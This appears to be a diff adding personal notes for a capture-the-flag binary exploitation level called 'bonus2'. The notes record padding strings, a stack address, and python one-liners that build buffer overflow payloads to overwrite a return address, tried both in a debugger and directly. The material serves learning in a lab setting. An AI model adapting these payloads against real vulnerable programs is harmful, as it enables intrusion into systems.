@@ -1,0 +1,16 @@
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+AAAAAAAAAAAAAAAAAAAAAAAAAA arg2
+
+0xbffff92d
+
+BBBBBBBBBBBBBBBBBBBBBBBBBB
+
+./bonus2 $(python -c 'print "A" * 26 + "\x2d\xf9\xff\xbf" + "A" * 10') $(python -c 'print "B" * 26')
+
+r $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHH" + "\x2d\xf9\xff\xbf" + "IIJJJJ"') $(python -c 'print "B" * 26')
+
+./bonus2 $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHH" + "\x2d\xf9\xff\xbf" + "IJJJJ"') $(python -c 'print "B" * 23 + "\x2d\xf9\xff\xbf"')
